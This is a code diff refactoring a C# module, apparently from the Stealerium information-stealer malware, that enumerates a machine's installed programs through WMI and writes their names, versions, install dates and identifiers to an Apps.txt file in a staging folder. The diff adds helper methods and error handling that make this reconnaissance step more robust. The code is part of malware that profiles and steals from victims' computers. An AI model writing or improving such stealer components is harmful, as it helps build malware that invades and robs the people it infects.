@@ -12,47 +12,71 @@ namespace Stealerium.Target.System
         public static void WriteAppsList(string sSavePath)
         {
             var apps = new List<App>();
+
             try
             {
                 var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Product");
-                foreach (var o in searcher.Get())
-                {
-                    var row = (ManagementObject)o;
-                    var app = new App();
-                    if (row["Name"] != null)
-                        app.Name = row["Name"].ToString();
-                    if (row["Version"] != null)
-                        app.Version = row["Version"].ToString();
-                    if (row["InstallDate"] != null)
-                    {
-                        var seconds = int.Parse(row["InstallDate"].ToString());
-                        var time = TimeSpan.FromSeconds(seconds);
-                        var dateTime = DateTime.Today.Add(time);
-                        app.InstallDate = dateTime.ToString("dd/MM/yyyy HH:mm:ss");
-                    }
 
-                    if (row["IdentifyingNumber"] != null)
-                        app.IdentifyingNumber = row["IdentifyingNumber"].ToString();
+                foreach (ManagementObject row in searcher.Get())
+                {
+                    var app = new App
+                    {
+                        Name = row["Name"]?.ToString(),
+                        Version = row["Version"]?.ToString(),
+                        InstallDate = GetInstallDate(row["InstallDate"]),
+                        IdentifyingNumber = row["IdentifyingNumber"]?.ToString()
+                    };
 
                     apps.Add(app);
                 }
             }
             catch (Exception ex)
             {
-                Logging.Log("InstalledApps fetch error:\n" + ex);
+                Logging.Log("InstalledApps fetch error:\n" + ex.Message);
             }
 
-            //Apps.Sort();
-            foreach (var app in apps)
-                File.AppendAllText(
-                    sSavePath + "\\Apps.txt",
-                    $"\nAPP: {app.Name}" +
-                    $"\n\tVERSION: {app.Version}" +
-                    $"\n\tINSTALL DATE: {app.InstallDate}" +
-                    $"\n\tIDENTIFYING NUMBER: {app.IdentifyingNumber}" +
-                    "\n\n");
+            // Save the list of apps to the file
+            SaveAppsToFile(sSavePath, apps);
         }
 
+        // Parse InstallDate from ManagementObject
+        private static string GetInstallDate(object installDateObj)
+        {
+            if (installDateObj == null) return "Unknown";
+
+            if (int.TryParse(installDateObj.ToString(), out var seconds))
+            {
+                var time = TimeSpan.FromSeconds(seconds);
+                var dateTime = DateTime.Today.Add(time);
+                return dateTime.ToString("dd/MM/yyyy HH:mm:ss");
+            }
+
+            return "Invalid date";
+        }
+
+        // Save the apps to a file
+        private static void SaveAppsToFile(string sSavePath, List<App> apps)
+        {
+            try
+            {
+                foreach (var app in apps)
+                {
+                    File.AppendAllText(
+                        Path.Combine(sSavePath, "Apps.txt"),
+                        $"\nAPP: {app.Name}" +
+                        $"\n\tVERSION: {app.Version}" +
+                        $"\n\tINSTALL DATE: {app.InstallDate}" +
+                        $"\n\tIDENTIFYING NUMBER: {app.IdentifyingNumber}" +
+                        "\n\n");
+                }
+            }
+            catch (Exception ex)
+            {
+                Logging.Log("Error saving apps list to file:\n" + ex.Message);
+            }
+        }
+
+        // Structure to hold app details
         private struct App
         {
             public string Name { get; set; }
